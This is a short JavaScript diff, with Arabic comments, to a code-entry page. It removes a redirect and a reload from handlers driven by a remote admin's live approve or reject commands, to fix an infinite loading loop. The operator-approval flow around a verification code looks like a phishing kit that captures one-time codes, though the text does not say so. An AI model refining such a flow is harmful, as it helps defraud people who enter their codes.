@@ -426,8 +426,13 @@ jQuery(document).ready(function() {
   }
   if (typeof window.listenForAdminCommands === 'function') {
     window.listenForAdminCommands({
-      onApproval: function () { window.location.href = 'verification.html'; },
-      onRejection: function (cmd) { showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b'); setTimeout(function(){ location.reload(); }, 3000); },
+      // الصفحة الحالية هي صفحة إدخال الرمز أصلاً: عند موافقة المدير لا نعيد تحميل الصفحة
+      // (إعادة التوجيه هنا كانت تسبب حلقة تحميل لا نهائية تمنع إدخال الرمز)
+      onApproval: function () {},
+      onRejection: function (cmd) {
+        // إظهار رسالة الرفض مرة واحدة فقط بدون إعادة تحميل (حتى لا تتكرر الحلقة)
+        showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b');
+      },
       onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
     });
   }
